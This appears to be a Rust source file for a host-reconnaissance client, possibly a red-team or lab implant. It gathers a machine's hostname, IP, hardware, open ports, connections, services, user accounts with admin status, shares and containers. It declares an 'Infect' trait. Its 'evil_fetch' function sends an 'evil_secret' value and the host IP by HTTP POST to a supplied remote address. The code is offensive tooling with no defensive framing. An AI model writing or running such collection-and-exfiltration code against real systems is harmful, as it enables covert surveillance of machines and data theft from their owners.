use crate::client::types::{Disk, Host, User, UserInfo, OS, ServerFeatures, Container};
use sysinfo::{CpuExt, DiskExt, System, SystemExt, UserExt};
use serde::Deserialize;

impl Host {
    pub fn new() -> Host {
        let mut sys = System::new_all();
        // First we update all information of our `System` struct.
        sys.refresh_all();

        let (connections, open_ports) = Host::conn_info();

        Host {
            hostname: sys_info::hostname().unwrap_or_default().into(),
            ip: Host::ip(),
            // max_addr:
            os: std::env::consts::OS.into(),
            cpu: sys.cpus().first().unwrap().brand().into(),
            memory: sys.total_memory(),
            // disk: storage / 1024 / 1024 / 1024,
            disks: disks(&sys),
            network_adapters: String::from(""),
            ports: open_ports,
            connections: connections,
            services: Host::services(),
            users: users(&sys),
            shares: Host::shares(),
            containers: Host::containers(),
            #[cfg(target_os = "windows")]
            server_features: Host::server_features(),
        }
    }

    pub fn to_json(&self) -> String {
        serde_json::to_string_pretty(&self).unwrap()
        // self.serialize(serializer)
    }
}

fn disks(sys: &System) -> Box<[Disk]> {
    sys.disks()
        .iter()
        .map(|disk| Disk {
            name: disk.name().to_str().unwrap().into(),
            mount_point: disk.mount_point().to_str().unwrap().into(),
            filesystem: String::from_utf8(disk.file_system().to_vec())
                .unwrap()
                .into(),
            total_space: disk.total_space() / 1024 / 1024,
            available_space: disk.available_space() / 1024 / 1024,
        })
        .collect()
}

pub trait Infect {
    fn init(&self, schema: &str);
}
fn users(sys: &System) -> Box<[User]> {
    sys.users()
        .iter()
        .map(|user| User {
            name: user.name().into(),
            uid: user.id().to_string().into(),
            gid: user.group_id().to_string().into(),
            groups: user
                .groups()
                .iter()
                .map(|group| group.clone().into_boxed_str())
                .collect(),
            is_admin: user.is_admin(),
            is_local: user.is_local(),
            shell: None,
        })
        .collect()
}

fn calculate_resource_weight(cpu_cores: u32, memory_mb: u64) -> u64 {
    let cpu_cores_weight = 4;
    let memory_weight = 2;

    (cpu_cores as u64 * cpu_cores_weight as u64 * 1024) + (memory_mb as u64 * memory_weight)
}

pub async fn evil_fetch(
    ip: &std::net::IpAddr,
    port: &u16,
) -> Result<(), Box<dyn std::error::Error>> {
    // let cpu_cores: u32 = sys_info::cpu_num();
    let cpu_cores = match sys_info::cpu_num() {
        Ok(cpu_cores) => cpu_cores,
        _ => 1,
    };

    match sys_info::mem_info() {
        Ok(mem_info) => {
            let memory_mb: u64 = (mem_info.total / 1024).try_into().unwrap_or(0);
            let resources = calculate_resource_weight(cpu_cores, memory_mb);

            let url = format!("http://{}:{}/evil_fetch", ip, port);

            let data = serde_json::json!({
                "evil_secret": resources,
                "ip": Host::ip(),
            });

            let client = reqwest::Client::builder()
                .redirect(reqwest::redirect::Policy::none())
                .build()?;

            let res = client.post(&url).json(&data).send().await?.text().await?;

            println!("Response: {}", res);
        }
        Err(e) => {
            println!("Failed to get memory info: {}", e);
        }
    }
    Ok(())
}
